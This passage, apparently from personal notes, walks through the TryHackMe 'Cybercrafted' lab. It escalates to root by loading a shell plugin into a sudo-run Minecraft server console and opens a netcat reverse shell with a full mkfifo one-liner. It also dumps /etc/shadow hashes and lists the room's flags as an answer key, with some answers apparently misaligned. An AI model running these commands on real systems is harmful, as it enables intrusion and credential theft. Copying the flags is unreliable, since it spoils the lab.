HTTP request sent, awaiting response... 200 OK
Length: 5294 (5.2K) [application/java-archive]
Saving to: ‘BukkitTTY-0.0.2.jar’

BukkitTTY-0.0.2.jar           100%[==============================================>]   5.17K  --.-KB/s    in 0.006s  

2023-03-08 21:38:02 (869 KB/s) - ‘BukkitTTY-0.0.2.jar’ saved [5294/5294]

cybercrafted@cybercrafted:~$ ls -lah
total 44K
drwxr-x--- 4 cybercrafted cybercrafted 4.0K Mar  8 21:38 .
drwxr-xr-x 4 root         root         4.0K Jun 27  2021 ..
lrwxrwxrwx 1 root         root            9 Sep 12  2021 .bash_history -> /dev/null
-rwxr-x--- 1 cybercrafted cybercrafted  220 Jun 27  2021 .bash_logout
-rwxr-x--- 1 cybercrafted cybercrafted 3.7K Jun 27  2021 .bashrc
-rw-rw-r-- 1 cybercrafted cybercrafted 5.2K Mar  8 21:37 BukkitTTY-0.0.2.jar
drwx------ 2 cybercrafted cybercrafted 4.0K Sep 12  2021 .cache
drwx------ 3 cybercrafted cybercrafted 4.0K Sep 12  2021 .gnupg
-rwxr-x--- 1 cybercrafted cybercrafted  807 Jun 27  2021 .profile
-rwxrwxr-x 1 cybercrafted cybercrafted 1.2K Feb 18 17:23 screenroot.sh
-rw-r----- 1 cybercrafted cybercrafted   38 Jun 27  2021 user.txt
cybercrafted@cybercrafted:~$ chmod 750 BukkitTTY-0.0.2.jar
cybercrafted@cybercrafted:~$ ls -lah
total 44K
drwxr-x--- 4 cybercrafted cybercrafted 4.0K Mar  8 21:38 .
drwxr-xr-x 4 root         root         4.0K Jun 27  2021 ..
lrwxrwxrwx 1 root         root            9 Sep 12  2021 .bash_history -> /dev/null
-rwxr-x--- 1 cybercrafted cybercrafted  220 Jun 27  2021 .bash_logout
-rwxr-x--- 1 cybercrafted cybercrafted 3.7K Jun 27  2021 .bashrc
-rwxr-x--- 1 cybercrafted cybercrafted 5.2K Mar  8 21:37 BukkitTTY-0.0.2.jar
drwx------ 2 cybercrafted cybercrafted 4.0K Sep 12  2021 .cache
drwx------ 3 cybercrafted cybercrafted 4.0K Sep 12  2021 .gnupg
-rwxr-x--- 1 cybercrafted cybercrafted  807 Jun 27  2021 .profile
-rwxrwxr-x 1 cybercrafted cybercrafted 1.2K Feb 18 17:23 screenroot.sh
-rw-r----- 1 cybercrafted cybercrafted   38 Jun 27  2021 user.txt

red color not executable, green yep

cybercrafted@cybercrafted:~$ chmod +x BukkitTTY-0.0.2.jar

cybercrafted@cybercrafted:~$ cd /opt/minecraft/cybercrafted/plugins/
cybercrafted@cybercrafted:/opt/minecraft/cybercrafted/plugins$ ls
LoginSystem  LoginSystem_v.2.4.jar
cybercrafted@cybercrafted:/opt/minecraft/cybercrafted/plugins$ cp /home/cybercrafted/BukkitTTY-0.0.2.jar .
cybercrafted@cybercrafted:/opt/minecraft/cybercrafted/plugins$ ls
BukkitTTY-0.0.2.jar  LoginSystem  LoginSystem_v.2.4.jar


cybercrafted@cybercrafted:~$ sudo /usr/bin/screen -r cybercrafted
-Bukkit-1.7.2-R0.3-2-g85f5776-b3023jnks]
        at net.minecraft.server.v1_7_R1.MinecraftServer.a(MinecraftServer.java:275) [craftbukkit-1.7.2-server.jar:git-Bukkit-1.7.2-R0.3-2-g85f5776-b3023jnks]
        at net.minecraft.server.v1_7_R1.DedicatedServer.init(DedicatedServer.java:175) [craftbukkit-1.7.2-server.jar:git-Bukkit-1.7.2-R0.3-2-g85f5776-b3023jnks]
        at net.minecraft.server.v1_7_R1.MinecraftServer.run(MinecraftServer.java:424) [craftbukkit-1.7.2-server.jar:git-Bukkit-1.7.2-R0.3-2-g85f5776-b3023jnks]
        at net.minecraft.server.v1_7_R1.ThreadServerApplication.run(SourceFile:617) [craftbukkit-1.7.2-server.jar:git-Bukkit-1.7.2-R0.3-2-g85f5776-b3023jnks]
Caused by: java.lang.ClassNotFoundException: org.spigotmc.Metrics
        at java.base/java.net.URLClassLoader.findClass(URLClassLoader.java:471) ~[?:?]
        at org.bukkit.plugin.java.PluginClassLoader.findClass(PluginClassLoader.java:77) ~[craftbukkit-1.7.2-server.jar:git-Bukkit-1.7.2-R0.3-2-g85f5776-b3023jnks]
        at org.bukkit.plugin.java.PluginClassLoader.findClass(PluginClassLoader.java:62) ~[craftbukkit-1.7.2-server.jar:git-Bukkit-1.7.2-R0.3-2-g85f5776-b3023jnks]
        at java.base/java.lang.ClassLoader.loadClass(ClassLoader.java:589) ~[?:?]
        at java.base/java.lang.ClassLoader.loadClass(ClassLoader.java:522) ~[?:?]
        ... 12 more
[21:30:28 INFO]: Server permissions file permissions.yml is empty, ignoring it
[21:30:28 INFO]: Done (0.826s)! For help, type "help" or "?"
[21:32:36 WARN]: Could not get information about this CraftBukkit version; perhaps you are running a custom one?: ConnectException
[21:34:47 WARN]: Could not get latest artifact information: ConnectException

>plugins
[21:43:53 INFO]: Plugins (1): LoginSystem

need to reload server minecraft

>reload
[21:44:29 INFO]: Server permissions file permissions.yml is empty, ignoring it
[21:44:29 INFO]: CONSOLE: Reload complete.

>plugins
[21:47:21 INFO]: Plugins (2): BukkitTTY, LoginSystem

using help command

>help
[21:47:39 INFO]: /setblock: A Mojang provided command.
[21:47:39 INFO]: /setidletimeout: Sets the server's idle timeout
[21:47:39 INFO]: /setworldspawn: Sets a worlds's spawn point. If no coordinates are specified, the player's coordinates will be used.
[21:47:39 INFO]: /shell: Lance une commande shell dans un repertoire
[21:47:39 INFO]: /spawnpoint: Sets a player's spawn point
[21:47:39 INFO]: /spreadplayers: Spreads players around a point
[21:47:39 INFO]: /stop: Stops the server with optional reason
[21:47:39 INFO]: /summon: A Mojang provided command.
[21:47:39 INFO]: /tell: Sends a private message to the given player
[21:47:39 INFO]: /tellraw: A Mojang provided command.
[21:47:39 INFO]: /testfor: Tests whether a specifed player is online
[21:47:39 INFO]: /testforblock: A Mojang provided command.
[21:47:39 INFO]: /time: Changes the time on each world
[21:47:39 INFO]: /timings: Records timings for all plugin events
[21:47:39 INFO]: /toggledownfall: Toggles rain on/off on a given world
[21:47:39 INFO]: /tp: Teleports the given player (or yourself) to another player or coordinates
[21:47:39 INFO]: /unregister: 
[21:47:39 INFO]: /version: Gets the version of this server including any plugins in use
[21:47:39 INFO]: /weather: Changes the weather
[21:47:39 INFO]: /whitelist: Manages the list of players allowed to use this server
[21:47:39 INFO]: /xp: Gives the specified player a certain amount of experience. Specify <amount>L to give levels instead, with a negative amount resulting in taking levels.

>shell whoami
[22:37:41 INFO]: Commande : whoami dans .
[22:37:41 INFO]: root
[22:37:41 INFO]: root
[22:37:41 INFO]: Terminé
>shell cat /root/root.txt
[22:37:57 INFO]: Commande : cat /root/root.txt dans .
[22:37:57 INFO]: THM{8bb1eda065ceefb5795a245568350a70}
[22:37:57 INFO]: THM{8bb1eda065ceefb5795a245568350a70}
[22:37:57 INFO]: Terminé

>shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.8.19.103 1338 >/tmp/f
[22:38:47 INFO]: Commande : rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.8.19.103 1338 >/tmp/f dans .
[22:38:47 INFO]: rm: cannot remove '/tmp/f': No such file or directory

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1338
listening on [any] 1338 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.root@cybercrafted:/opt/minecraft/cybercrafted# whoami
whoami
root@cybercrafted:/opt/minecraft/cybercrafted# cd /root
cd /root
root@cybercrafted:~# ls
ls
root.txt
root@cybercrafted:~# cat root.txt
cat root.txt
THM{8bb1eda065ceefb5795a245568350a70}
root@cybercrafted:~# cat /etc/shadow
cat /etc/shadow
root:*:18480:0:99999:7:::
daemon:*:18480:0:99999:7:::
bin:*:18480:0:99999:7:::
sys:*:18480:0:99999:7:::
sync:*:18480:0:99999:7:::
games:*:18480:0:99999:7:::
man:*:18480:0:99999:7:::
lp:*:18480:0:99999:7:::
mail:*:18480:0:99999:7:::
news:*:18480:0:99999:7:::
uucp:*:18480:0:99999:7:::
proxy:*:18480:0:99999:7:::
www-data:*:18480:0:99999:7:::
backup:*:18480:0:99999:7:::
list:*:18480:0:99999:7:::
irc:*:18480:0:99999:7:::
gnats:*:18480:0:99999:7:::
nobody:*:18480:0:99999:7:::
systemd-network:*:18480:0:99999:7:::
systemd-resolve:*:18480:0:99999:7:::
syslog:*:18480:0:99999:7:::
messagebus:*:18480:0:99999:7:::
_apt:*:18480:0:99999:7:::
lxd:*:18480:0:99999:7:::
uuidd:*:18480:0:99999:7:::
dnsmasq:*:18480:0:99999:7:::
landscape:*:18480:0:99999:7:::
pollinate:*:18480:0:99999:7:::
sshd:*:18804:0:99999:7:::
mysql:!:18804:0:99999:7:::
xxultimatecreeperxx:$6$YVPtRid3$yHsAoVRdkH7V0onPbefgRPeyj1xrBNxnzyZKIopigxaMB088YDW/4UkLIQ4A9ivEQwcMVkGhRhA2.u8GeyZiD.:18805:0:99999:7:::
cybercrafted:$6$F6ChzVlS$O4FKDNkV0xyfhBelxIU68Lo3GCyA9RHWt8OgpYixA8nWacYynElKj9BiQ0vLIIi.r3FP3Z37nR5gaDHdSbVrF/:18805:0:99999:7:::


```

![[Pasted image 20230308121024.png]]

![[Pasted image 20230308121423.png]]

![[Pasted image 20230308125628.png]]

![[Pasted image 20230308125751.png]]
![[Pasted image 20230308131807.png]]








How many ports are open?

Correct Answer

What service runs on the highest port?

*3*

Any subdomains? (Alphabetical order)

*Minecraft*

On what page did you find the vulnerability?

*admin store www*

What is the admin's username? (Case-sensitive)

*xXUltimateCreeperXx*

What is the web flag?

*THM{bbe315906038c3a62d9b195001f75008}*

Can you get the Minecraft server flag?

*THM{ba93767ae3db9f5b8399680040a0c99e}*

What is the name of the sketchy plugin?

*LoginSystem*

What is the user's flag?

*THM{b4aa20aaf08f174473ab0325b24a45ca}*

Finish the job and give me the root flag!

*THM{8bb1eda065ceefb5795a245568350a70}*

### The End

﻿And there you have it! This was "**Cybercrafted**" by [madrinch](https://tryhackme.com/p/madrinch).

Check me out on: [Twitter](https://twitter.com/madr1nch)!

Answer the questions below

Good luck on your future adventures!

Question Done


[[LocalPotato]]